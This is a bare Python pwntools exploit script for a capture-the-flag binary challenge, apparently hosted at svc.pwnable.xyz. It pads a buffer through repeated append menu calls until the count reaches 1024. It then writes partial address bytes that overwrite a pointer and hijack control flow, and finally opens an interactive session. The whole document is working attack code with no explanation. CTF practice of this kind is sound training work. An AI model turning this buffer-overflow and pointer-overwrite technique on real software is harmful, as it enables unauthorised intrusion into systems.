from pwn import *
from ctypes import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
p = remote('svc.pwnable.xyz',30022)
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
lib = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

x = 0x00000000006022A0 # 1024
dest = 0x00000000006026A0 # 8
message = 0x00000000006026A8
count = 0

def quit():
	sa('>','0')

def short_append():
	global count
	sa('>','1')
	byte = int(p.recvuntil('chars').split(' ')[3])
	if byte == 0:
		pass
	else:
		count += byte
		sa(':','A'*byte)

def long_append():
	global count
	sa('>','2')
	byte = int(p.recvuntil('chars').split(' ')[3])
	if byte == 0:
		pass
	else:
		count += byte
		sa(':','A'*byte)

def print_it():
	sa('>','3')

def save_it1():
	sa('>','4')

def save_it2(byte):
	sa('>','4')
	sa('?',str(byte))

sa('>','2')
byte = int(p.recvuntil('chars').split(' ')[3])
count += byte
sa(':','\x2d\x0b\x40' + 'A'*(byte-3))
log.info('count = {}'.format(count))

while True:
	if count < 1000:
		short_append()
	else:
		break
	log.info('count : {}'.format(count))

while True:
	sa('>','1')
	byte = int(p.recvuntil('chars').split(' ')[3])
	log.info('byte : {}'.format(byte))
	if byte == 0:
		pass
	else:
		if count == 1024:
			sa(':','\xa0\x20\x60')
			break
		else:
			sa(':','A')
			count += 1

save_it2(3)
log.info('Sleep 1 min -> exit')
p.interactive()